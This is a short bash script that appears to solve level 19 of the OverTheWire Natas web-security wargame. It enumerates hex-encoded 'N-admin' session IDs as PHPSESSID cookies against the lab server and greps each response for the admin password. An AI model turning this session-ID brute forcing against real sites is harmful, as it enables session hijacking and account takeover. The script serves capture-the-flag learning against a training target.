#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi

for i in `seq 0 640`
do
  tmp=`curl -s --user natas19:$1 \
    -b "PHPSESSID=$(echo -n $i'-admin' | xxd -p)" \
    -d "username=admin&password=" \
    http://natas19.natas.labs.overthewire.org/`
  printf '\rLooking in session %03d' $i
  # echo $tmp
  pass=`echo $tmp | grep -E -o 'Password: .{32}'`
  if [ $? -eq 0 ]; then
    printf '\nPassword found in session %03d\n' $i
    echo $pass
    break
  fi
done
